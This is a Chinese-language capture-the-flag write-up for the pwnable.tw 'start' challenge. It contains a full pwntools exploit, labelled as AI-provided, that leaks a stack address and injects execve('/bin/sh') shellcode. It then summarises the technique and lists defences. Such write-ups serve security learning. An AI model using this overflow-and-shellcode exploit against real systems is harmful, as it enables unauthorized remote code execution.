## AI提供的POC

```!=
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

# ============ 連線設定 ============
# 本地測試（正常執行）
# r = process(['qemu-i386', './start'])

# 本地除錯（需要另開終端執行 gdb-multiarch，然後 target remote :1234）
# r = process(['qemu-i386', '-g', '1234', './start'])

# 遠端攻擊
r = remote('chall.pwnable.tw', 10000)

# ============ Stage 1: 洩漏 Stack 地址 ============
log.info("Stage 1: Leaking stack address...")

padding = b'A' * 0x14                  # 20 bytes padding
ret_to_write = p32(0x08048087)         # 跳回 write syscall

payload1 = padding + ret_to_write

r.recvuntil(b'CTF:')
r.send(payload1)

# 接收洩漏的 ESP（write 會輸出 20 bytes，前 4 bytes 就是 ESP）
leaked_data = r.recv(20)
leak_esp = u32(leaked_data[:4])
log.success(f"Leaked ESP: 0x{leak_esp:08x}")

# ============ Stage 2: 執行 Shellcode ============
log.info("Stage 2: Sending shellcode...")

# execve("/bin/sh", NULL, NULL)
shellcode = b"\x31\xc0"              # xor eax, eax
shellcode += b"\x31\xd2"             # xor edx, edx
shellcode += b"\x52"                 # push edx
shellcode += b"\x68\x2f\x2f\x73\x68" # push "//sh"
shellcode += b"\x68\x2f\x62\x69\x6e" # push "/bin"
shellcode += b"\x89\xe3"             # mov ebx, esp
shellcode += b"\x31\xc9"             # xor ecx, ecx
shellcode += b"\xb0\x0b"             # mov al, 0xb
shellcode += b"\xcd\x80"             # int 0x80

# 計算 shellcode 地址
# leak_esp + 0x14 = shellcode 起始位置
shellcode_addr = leak_esp + 0x14
log.info(f"Shellcode address: 0x{shellcode_addr:08x}")

payload2 = padding + p32(shellcode_addr) + shellcode

r.send(payload2)

# ============ Get Shell ============
log.success("Enjoy your shell!")
r.interactive()

```


## AI總結

這題是經典的 **Stack Buffer Overflow + Information Leak + Shellcode Injection** 組合技。

### 核心技巧

1. **Information Leak（資訊洩漏）**
   - 利用第一次 ROP 跳回 write，洩漏 stack 地址
   - 因為沒有 PIE，可以直接使用固定的 gadget 地址

> ROP（Return-Oriented Programming）攻擊是一種在 無法直接執行 shellcode（例如啟用 NX 保護） 的情況下，
攻擊者利用程式內既有的機器碼片段（gadgets），重新拼湊出惡意邏輯來達成控制系統的攻擊手法。

2. **Shellcode Injection（程式碼注入）**
   - 利用洩漏的地址計算 shellcode 位置
   - 因為 NX disabled，stack 可執行
   - 第二次 overflow 注入並執行 shellcode

3. **關鍵計算**
   - 兩次執行的 stack 結構相同
   - 偏移量固定：shellcode_addr = leak_esp + 0x14

### 學到的技巧

- ✅ 使用 QEMU 在 64-bit 系統執行 32-bit 程式
- ✅ 使用 GDB 遠端除錯 QEMU 程式
- ✅ Stack 布局分析和地址計算
- ✅ 兩階段 ROP 攻擊
- ✅ Shellcode 編寫與注入

### 防禦建議

如果要防禦這類攻擊，應該：
- ✅ 開啟 Stack Canary（防止 buffer overflow）
- ✅ 開啟 NX（防止 stack 執行）
- ✅ 開啟 PIE（防止固定地址攻擊）
- ✅ 限制 read 的長度（避免 buffer overflow）

